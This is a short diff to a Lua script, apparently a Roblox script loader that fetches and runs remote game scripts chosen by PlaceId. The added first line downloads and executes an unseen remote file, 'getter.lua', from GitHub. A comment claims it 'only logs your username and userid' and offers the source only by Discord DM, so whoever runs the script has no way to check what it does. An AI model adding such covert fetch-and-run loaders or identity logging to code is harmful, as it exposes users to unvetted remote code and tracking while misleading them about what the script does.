@@ -1,3 +1,4 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/loxxit/scripts/main/getter.lua"))() --this only logs your username and userid dont worry if you want the source dm me in discord.
 if game.PlaceId == 11468159863 or game.PlaceId == 6152116144 or  game.PlaceId == 11468075017 or  game.PlaceId == 2142948266 then
     loadstring(game:HttpGet("https://raw.githubusercontent.com/loxxit/scripts/main/game.lua"))()
 elseif game.PlaceId == 6777872443 then
